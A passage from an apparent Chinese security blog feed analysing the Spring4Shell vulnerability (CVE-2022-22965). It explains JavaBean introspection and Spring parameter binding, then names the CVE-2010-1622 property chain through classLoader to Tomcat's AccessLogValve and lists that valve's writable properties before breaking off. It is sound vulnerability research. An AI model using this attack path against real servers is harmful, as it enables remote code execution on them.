<p>Reactor 模式和Proactor 模式的主要区别在于：对于工作线程而言，Reactor 发来的是已就绪的读写事件，而Proactor 发来的是已经完成的读写事件（异步I/O的处理在内核中完成，同步I/O在主线程自己实现）</p>]]></content><author><name>Theoyu</name></author><category term="cource" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">CVE-2022-22965 SpringFramework 漏洞分析</title><link href="https://theoyu.top/2022/spring4shell" rel="alternate" type="text/html" title="CVE-2022-22965 SpringFramework 漏洞分析" /><published>2022-04-10T00:00:00+08:00</published><updated>2022-04-10T00:00:00+08:00</updated><id>https://theoyu.top/2022/spring4shell</id><content type="html" xml:base="https://theoyu.top/2022/spring4shell"><![CDATA[<!--more-->

<h2 id="前言">前言</h2>

<p>这个洞爆发的第二天，在拿到exp并复现成功后，其实心里是想着趁热度发一下文章的，但完完整整跟进完这个漏洞后，我发现我也只是停留在 <em>复现</em> 的层面上，这也让我思考一个问题，<strong>写一篇漏洞分析的文章，需要具备怎样的素养？</strong></p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220408134504.png" alt="image-20220407174417845" /></p>

<p>虽然作为初学者，所谓漏洞分析大多都是站在前人的肩膀上，不过还是希望可以写出一些自己的东西，踩的坑也好一些无关痛痒的理解也罢。希望读完这篇文章，你可以基本上解答以下几个问题：</p>

<ol>
  <li>为什么版本需要JDK9及以上，而JDK8不行？</li>
  <li>为什么是需要Spring tomcat war部署方式，Springboot jar会受影响吗？</li>
  <li>漏洞的影响面和利用方式是什么，新的PATCH又是如何修复的？</li>
</ol>

<p>带着这三个问题，让我们走进spring4shell。</p>

<h2 id="javabean与springbean">JavaBean与SpringBean</h2>

<p>什么是JavaBean呢？</p>

<p>JavaBean在语法上和类没有区别，其内部没有特定的功能方法，主要包含信息字段和存储方法，如果一个类遵从了以下JavaBean的标准，那么它就是一个JavaBean：</p>

<ol>
  <li>所有属性为<code class="language-plaintext highlighter-rouge">private</code>。</li>
  <li>类声明为<code class="language-plaintext highlighter-rouge">public</code>，提供默认的无参构造方法。</li>
  <li>提供<code class="language-plaintext highlighter-rouge">setter&amp;getter</code>方法，让外部可以<code class="language-plaintext highlighter-rouge">设置&amp;获取</code>JavaBean的属性。</li>
</ol>

<p>同时，JavaBean对其方法和属性的命名有一定要求，去掉<code class="language-plaintext highlighter-rouge">setter&amp;getter</code>方法的前缀，剩下部分就是属性名(小写)。</p>

<p>在idea中就支持自动根据属性填充<code class="language-plaintext highlighter-rouge">setter&amp;getter</code>，实现一个简单的JavaBean。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220420125751.png" alt="image-20220420115200100" /></p>

<p>如果你之前对SpringMVC没有任何了解的话，建议手动搭建一下相关<a href="https://theoyu.top/2022/04/06/springMVC01.html#%E9%80%9A%E8%BF%87%E5%AE%9E%E4%BD%93-bean-%E6%8E%A5%E6%94%B6%E8%AF%B7%E6%B1%82%E5%8F%82%E6%95%B0">环境</a>，在这个控制器里我们就通过JavaBean接收请求参数：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/login5"</span><span class="o">)</span>
<span class="kd">public</span> <span class="nc">String</span> <span class="nf">login5</span><span class="o">(</span><span class="nc">User</span> <span class="n">user</span><span class="o">,</span> <span class="nc">Model</span> <span class="n">model</span><span class="o">){</span>
    <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"name"</span><span class="o">,</span><span class="n">user</span><span class="o">.</span><span class="na">getUsername</span><span class="o">());</span>
    <span class="k">return</span> <span class="s">"login"</span><span class="o">;</span>
<span class="o">}</span>
</code></pre></div></div>

<p>发送以下请求：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421175428.png" alt="image-20220420104726972" /></p>

<p>可以看到SpringMVC自动把GET传入的参数注入到了bean对象中。</p>

<p>对命名规则有如此要求的好处在于，当一个类被当作JavaBean使用时，即使其内部私有属性无法被访问，也可以通过方法名推断出来，那么 <strong>就可以通过反射自动注入到其属性中</strong> 。</p>

<p>Java 核心库提供的<code class="language-plaintext highlighter-rouge">Introspector</code>就可以获取一个JavaBean的所有属性以及对应属性的读写方法，也称为内省。</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span>  <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="nc">BeanInfo</span> <span class="n">info</span> <span class="o">=</span> <span class="nc">Introspector</span><span class="o">.</span><span class="na">getBeanInfo</span><span class="o">(</span><span class="nc">User</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="k">for</span> <span class="o">(</span><span class="nc">PropertyDescriptor</span> <span class="n">pd</span> <span class="o">:</span> <span class="n">info</span><span class="o">.</span><span class="na">getPropertyDescriptors</span><span class="o">())</span> <span class="o">{</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"[Property]"</span><span class="o">+</span><span class="n">pd</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"  [ReadMethod]"</span> <span class="o">+</span> <span class="n">pd</span><span class="o">.</span><span class="na">getReadMethod</span><span class="o">());</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"  [WriteMethod]"</span> <span class="o">+</span> <span class="n">pd</span><span class="o">.</span><span class="na">getWriteMethod</span><span class="o">());</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">class</span> <span class="nc">User</span> <span class="o">{</span>
        <span class="kd">private</span> <span class="nc">String</span> <span class="n">username</span><span class="o">;</span>
        <span class="kd">private</span> <span class="nc">String</span> <span class="n">password</span><span class="o">;</span>

        <span class="kd">public</span> <span class="nc">String</span> <span class="nf">getUsername</span><span class="o">()</span> <span class="o">{</span>
            <span class="k">return</span> <span class="n">username</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setUsername</span><span class="o">(</span><span class="nc">String</span> <span class="n">username</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">username</span> <span class="o">=</span> <span class="n">username</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="kd">public</span> <span class="nc">String</span> <span class="nf">getPassword</span><span class="o">()</span> <span class="o">{</span>
            <span class="k">return</span> <span class="n">password</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setPassword</span><span class="o">(</span><span class="nc">String</span> <span class="n">password</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">password</span> <span class="o">=</span> <span class="n">password</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421175434.png" alt="image-20220420130721427" /></p>

<p>在输出的结果中，后两者是我们预想范围内的，但是这个class属性是怎么来的呢？</p>

<p>原因在于在Java中，所有类都会继承于<code class="language-plaintext highlighter-rouge">Object</code>类，而在<code class="language-plaintext highlighter-rouge">Object</code>中又存在<code class="language-plaintext highlighter-rouge">getClass()</code>方法，由于内省机制就会认为存在一个class属性。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421175437.png" alt="image-20220420131236499" /></p>

<p>可以拿到class属性，不过好在class属性并没有<code class="language-plaintext highlighter-rouge">WriteMethod</code>，即没有set方法去设置其值，所以这也不算是一个严峻的问题。</p>

<p>走到这，我们有必要走进SpringMVC数据绑定的步骤，在上述的参数绑定过程，主要发生在下图的第五步中。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220412155730.png" alt="image-20220410141300306" /></p>

<p>我们不一一展开调用链，挑几个关键类、方法分析：</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">org.springframework.beans.AbstractNestablePropertyAccessor</code></li>
</ul>

<p>JavaBean的核心处理抽象类，包含set、get等处理逻辑实现以及 <strong>嵌套属性</strong> 的处理。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421175441.png" alt="image-20220421160055832" /></p>

<p>从这个方法所引申的几个方法主要是解决了递归调用的问题，比如如果我在java中想调用<code class="language-plaintext highlighter-rouge">user.getInfo().getAge()</code>，那么传入的参数就为<code class="language-plaintext highlighter-rouge">user.info.age</code>，在解析流程中会对<code class="language-plaintext highlighter-rouge">.</code>进行了分割识别，并递归返回调用对象。</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">org.springframework.beans.CachedIntrospectionResults</code>：</li>
</ul>

<p>缓存了JavaBean的信息，之后需要使用可以直接从这获取。内部使用了<code class="language-plaintext highlighter-rouge">Introspector.getBeanInfo(beanClass)</code>进行了存储，这我们可不陌生，也正是因为缓存的存在，在上述例子中即使 <strong>info</strong>，<strong>age</strong>都是私有属性，我们也可以通过内省机制访问到。</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">org.springframework.beans.BeanWrapperImpl</code>：</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">BeanWrapper</code>接口的实现类和抽象类<code class="language-plaintext highlighter-rouge">AbstractNestablePropertyAccessor</code>的子类，其对JavaBean进行了封装，其<code class="language-plaintext highlighter-rouge">setValue</code>方法通过反射完成了最终的属性注入。</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421175444.png" alt="image-20220421161153787" /></p>

<p>总结以上三点，目前我们得知的内容为：</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">CachedIntrospectionResults</code>缓存中使用<code class="language-plaintext highlighter-rouge">Introspector.getBeanInfo(beanClass)</code>进行了存储，使得我们可以通过内省机制访问私有属性，并且由于类继承我们可以拿到class属性。</li>
  <li><code class="language-plaintext highlighter-rouge">AbstractNestablePropertyAccessor</code>中可递归处理请求，和内省机制结合可越过前面不存在set方法的属性。</li>
  <li><code class="language-plaintext highlighter-rouge">BeanWrapperImpl.setValue()</code>可通过反射对一个存在set方法的属性设置其值。</li>
</ol>

<p>其实现在，我们的意图已经很明显了，即使class属性不存在<code class="language-plaintext highlighter-rouge">WriteMethod</code>，我们也可以通过内省和递归调用的机制，从class属性一路延伸，通过<code class="language-plaintext highlighter-rouge">class.xxx.xxx.xxx</code>，找到一个可以利用的属性。</p>

<h2 id="cve-2010-1622是如何做的">CVE-2010-1622是如何做的？</h2>

<p>在<code class="language-plaintext highlighter-rouge">CachedIntrospectionResults</code>的构造方法中，有一个很明显的黑名单：</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421175450.png" alt="image-20220421163405170" /></p>

<p>相当于如果调用<code class="language-plaintext highlighter-rouge">class.classLoader</code>则会被直接拦截。</p>

<p>这也拉开了CVE-2022-22965的前身的序幕：CVE-2010-1622 SpringMVC框架任意代码执行漏洞。</p>

<p>我们把目光放在12年前，classLoader还没有放入黑名单，我们是如何利用的：</p>

<p><code class="language-plaintext highlighter-rouge">class.classLoader.resources.context.parent.pipeline.first</code></p>

<p>其中：</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">context</code>对应<code class="language-plaintext highlighter-rouge">StandardContext</code></li>
  <li><code class="language-plaintext highlighter-rouge">parent</code>对应<code class="language-plaintext highlighter-rouge">StandardHost</code></li>
  <li><code class="language-plaintext highlighter-rouge">pipeline</code>对应<code class="language-plaintext highlighter-rouge">StandardPipeline</code></li>
  <li><code class="language-plaintext highlighter-rouge">first</code>对应<code class="language-plaintext highlighter-rouge">AccessLogValve</code></li>
</ul>

<p>在<code class="language-plaintext highlighter-rouge">org.apache.catalina.valves.AccessLogValve</code>中，我们可以找到许多存在set方法的属性：</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span>  <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="nc">BeanInfo</span> <span class="n">info</span> <span class="o">=</span> <span class="nc">Introspector</span><span class="o">.</span><span class="na">getBeanInfo</span><span class="o">(</span><span class="nc">AccessLogValve</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="k">for</span> <span class="o">(</span><span class="nc">PropertyDescriptor</span> <span class="n">pd</span> <span class="o">:</span> <span class="n">info</span><span class="o">.</span><span class="na">getPropertyDescriptors</span><span class="o">())</span> <span class="o">{</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"[Property]"</span><span class="o">+</span><span class="n">pd</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"  [ReadMethod]"</span> <span class="o">+</span> <span class="n">pd</span><span class="o">.</span><span class="na">getReadMethod</span><span class="o">());</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"  [WriteMethod]"</span> <span class="o">+</span> <span class="n">pd</span><span class="o">.</span><span class="na">getWriteMethod</span><span class="o">());</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="c1">//输出：</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">asyncSupported</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">boolean</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">ValveBase</span><span class="o">.</span><span class="na">isAsyncSupported</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">ValveBase</span><span class="o">.</span><span class="na">setAsyncSupported</span><span class="o">(</span><span class="kt">boolean</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">buffered</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">boolean</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">isBuffered</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">setBuffered</span><span class="o">(</span><span class="kt">boolean</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">checkExists</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">boolean</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">isCheckExists</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">setCheckExists</span><span class="o">(</span><span class="kt">boolean</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="kd">class</span>
  <span class="err">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kd">final</span> <span class="kd">native</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Class</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Object</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kc">null</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">condition</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">getCondition</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">setCondition</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">conditionIf</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">getConditionIf</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">setConditionIf</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">conditionUnless</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">getConditionUnless</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">setConditionUnless</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">container</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">Container</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">ValveBase</span><span class="o">.</span><span class="na">getContainer</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">ValveBase</span><span class="o">.</span><span class="na">setContainer</span><span class="o">(</span><span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">Container</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">directory</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">getDirectory</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">setDirectory</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">domain</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kd">final</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">LifecycleMBeanBase</span><span class="o">.</span><span class="na">getDomain</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kd">final</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">LifecycleMBeanBase</span><span class="o">.</span><span class="na">setDomain</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">domainInternal</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">ValveBase</span><span class="o">.</span><span class="na">getDomainInternal</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kc">null</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">enabled</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">boolean</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">getEnabled</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">setEnabled</span><span class="o">(</span><span class="kt">boolean</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">encoding</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">getEncoding</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">setEncoding</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">fileDateFormat</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">getFileDateFormat</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">setFileDateFormat</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">ipv6Canonical</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">boolean</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">getIpv6Canonical</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">setIpv6Canonical</span><span class="o">(</span><span class="kt">boolean</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">locale</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">getLocale</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">setLocale</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">maxDays</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">int</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">getMaxDays</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">setMaxDays</span><span class="o">(</span><span class="kt">int</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">maxLogMessageBufferSize</span>
